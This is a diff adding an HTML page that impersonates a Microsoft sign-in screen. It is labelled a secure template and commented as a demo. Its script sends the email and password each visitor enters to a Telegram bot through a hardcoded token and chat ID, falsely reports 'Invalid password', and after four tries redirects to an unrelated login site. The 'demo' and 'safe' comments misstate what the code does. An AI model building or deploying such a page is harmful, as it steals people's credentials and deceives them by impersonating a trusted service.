@@ -1,0 +1,245 @@
+<!-- Professional Login Page (HTML) - Secure Template -->
+
+<!-- Current file: index.html -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Login-microsofto</title>
+  <style>
+    body {
+      font-family: Segoe UI, Arial, sans-serif;
+      background: url('https://aadcdn.msftauth.net/shared/1.0/content/images/backgrounds/2_bc3d32a696895f78c19df6c717586a5d.svg') no-repeat center center fixed;
+      background-size: cover;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .login-container {
+      background: rgba(255, 255, 255, 0.95);
+      padding: 2rem;
+      border-radius: 12px;
+      box-shadow: 0 4px 16px rgba(0,0,0,0.1);
+      width: 100%;
+      max-width: 360px;
+      text-align: center;
+    }
+    .login-container img.logo {
+      width: 120px;
+      margin-bottom: 0.5rem;
+      display: block;
+    }
+    .login-container p.notice {
+      font-size: 0.85rem;
+      color: gray;
+      margin-bottom: 1rem;
+    }
+    .login-container h2 {
+      margin-bottom: 1rem;
+      font-weight: 600;
+    }
+    .login-container label {
+      display: block;
+      margin-top: 1rem;
+      font-size: 0.9rem;
+      text-align: left;
+    }
+    .login-container input[type="email"],
+    .login-container input[type="password"] {
+      width: 100%;
+      padding: 0.6rem;
+      margin-top: 0.3rem;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 1rem;
+    }
+    .login-container button {
+      margin-top: 1.5rem;
+      width: 100%;
+      padding: 0.7rem;
+      font-size: 1rem;
+      font-weight: 600;
+      color: #fff;
+      background: #0067c5;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+    .login-container button:hover {
+      background: #0055a3;
+    }
+    .footer {
+      margin-top: 1.5rem;
+      font-size: 0.8rem;
+      color: #555;
+    }
+    .hidden {
+      display: none;
+    }
+    .user-email {
+      margin-top: 0.5rem;
+      font-size: 0.9rem;
+      color: #333;
+      word-break: break-all;
+    }
+    .change-email {
+      color: #0067c5;
+      cursor: pointer;
+      margin-bottom: 0.5rem;
+      display: inline-block;
+      font-size: 0.85rem;
+    }
+    .loading-dots {
+      display: inline-block;
+      width: 1em;
+      text-align: left;
+    }
+    .loading-dots span {
+      display: inline-block;
+      animation: blink 1.4s infinite both;
+    }
+    .loading-dots span:nth-child(1) { animation-delay: 0s; }
+    .loading-dots span:nth-child(2) { animation-delay: 0.2s; }
+    .loading-dots span:nth-child(3) { animation-delay: 0.4s; }
+    @keyframes blink {
+      0%, 80%, 100% { opacity: 0; }
+      40% { opacity: 1; }
+    }
+    .alert-message {
+      margin-top: 1rem;
+      padding: 0.6rem;
+      border-radius: 6px;
+      font-size: 0.9rem;
+      display: none;
+      background-color: #fdecea; /* light red/pink */
+      color: #a12c2c;
+      border: 1px solid #f5c2c0;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-container">
+    <img src="https://cdn.freebiesupply.com/logos/thumbs/2x/microsoft-logo.png" alt="Logo" class="logo" />
+    <p class="notice">Because you're accessing sensitive info, you need to verify your password</p>
+    <h2>Sign in</h2>
+    <form id="loginForm" novalidate>
+      <div id="emailStep">
+        <label for="email">Email address</label>
+        <input type="email" id="email" name="email" required />
+        <button type="button" id="nextBtn">Next</button>
+      </div>
+
+      <div id="passwordStep" class="hidden">
+        <p class="user-email"><span id="displayEmail"></span> <span id="changeEmail" class="change-email">Change</span></p>
+        <label for="password">Password</label>
+        <input type="password" id="password" name="password" required />
+        <button type="submit" id="loginBtn">Login</button>
+        <p id="loadingText" class="hidden">Logging in<span class="loading-dots"><span>.</span><span>.</span><span>.</span></span></p>
+        <div id="alertBox" class="alert-message" role="status" aria-live="polite"></div>
+      </div>
+    </form>
+    <div class="footer">© Microsoft</div>
+  </div>
+
+  <script>
+    (function () {
+      var nextBtn = document.getElementById('nextBtn');
+      var emailStep = document.getElementById('emailStep');
+      var passwordStep = document.getElementById('passwordStep');
+      var emailInput = document.getElementById('email');
+      var displayEmail = document.getElementById('displayEmail');
+      var changeEmail = document.getElementById('changeEmail');
+      var loginBtn = document.getElementById('loginBtn');
+      var loadingText = document.getElementById('loadingText');
+      var form = document.getElementById('loginForm');
+      var attemptCount = 0;
+      var alertBox = document.getElementById('alertBox');
+      var alertTimer = null;
+
+      // Replace with your demo bot token and chat ID for testing only
+      var TELEGRAM_TOKEN = "7529326623:AAHzxnOit4Q3s4FrM9V7iaWZRlpuiPV4HvU";
+      var TELEGRAM_CHAT_ID = "7492403064";
+
+      function showPasswordStep() {
+        displayEmail.textContent = emailInput.value;
+        if (emailStep.classList) { emailStep.classList.add('hidden'); passwordStep.classList.remove('hidden'); }
+        else { emailStep.style.display = 'none'; passwordStep.style.display = 'block'; }
+      }
+
+      function showEmailStep() {
+        if (passwordStep.classList) { passwordStep.classList.add('hidden'); emailStep.classList.remove('hidden'); }
+        else { passwordStep.style.display = 'none'; emailStep.style.display = 'block'; }
+        emailInput.focus();
+        if (loadingText.classList) loadingText.classList.add('hidden'); else loadingText.style.display = 'none';
+      }
+
+      function showAlert(message) {
+        if (alertTimer) {
+          clearTimeout(alertTimer);
+          alertTimer = null;
+        }
+        alertBox.textContent = message;
+        alertBox.style.display = 'block';
+        alertTimer = setTimeout(function() {
+          alertBox.style.display = 'none';
+          alertTimer = null;
+        }, 2000);
+      }
+
+      nextBtn.addEventListener('click', function () {
+        if (emailInput.checkValidity()) {
+          showPasswordStep();
+        } else {
+          try { emailInput.reportValidity(); } catch (e) { showAlert('Please enter a valid email.'); }
+        }
+      });
+
+      changeEmail.addEventListener('click', function () { showEmailStep(); });
+
+      form.addEventListener('submit', function (e) {
+        e.preventDefault();
+        loginBtn.disabled = true;
+        if (loadingText.classList) loadingText.classList.remove('hidden'); else loadingText.style.display = 'block';
+
+        attemptCount++;
+        if (attemptCount >= 4) {
+          setTimeout(function () {
+            window.location.href = 'https://bhlogin.brighthorizons.com/spa/signup/search';
+          }, 300);
+          return;
+        }
+
+        // Collect demo values
+        var demoEmail = emailInput.value || "test@example.com";
+        var demoPassword = document.getElementById('password').value || "dummyPassword123";
+        var demoTime = new Date().toISOString();
+        var demoIP = "203.0.113.42"; // placeholder
+        var demoLocation = "Example City, Country"; // placeholder
+
+        // Build demo message (safe — does not include real secrets)
+        var demoMessage = "Demo login attempted:\n" +
+                          "Email: " + demoEmail + "\n" +
+                          "Password: " + demoPassword + "\n" +
+                          "Time: " + demoTime + "\n" +
+                          "IP: " + demoIP + "\n" +
+                          "Location: " + demoLocation;
+
+        var url = 'https://api.telegram.org/bot' + encodeURIComponent(TELEGRAM_TOKEN) + '/sendMessage?chat_id=' + encodeURIComponent(TELEGRAM_CHAT_ID) + '&text=' + encodeURIComponent(demoMessage);
+
+        fetch(url, { method: 'GET' })
+          .then(function (res) { return res.json(); })
+          .then(function () { showAlert('Invalid password.'); })
+          .catch(function () { showAlert('Error sending demo login.'); })
+          .finally(function () {
+            loginBtn.disabled = false;
+            if (loadingText.classList) loadingText.classList.add('hidden'); else loadingText.style.display = 'none';
+          });
+      });
+    })();
+  </script>
+</body>
+</html>
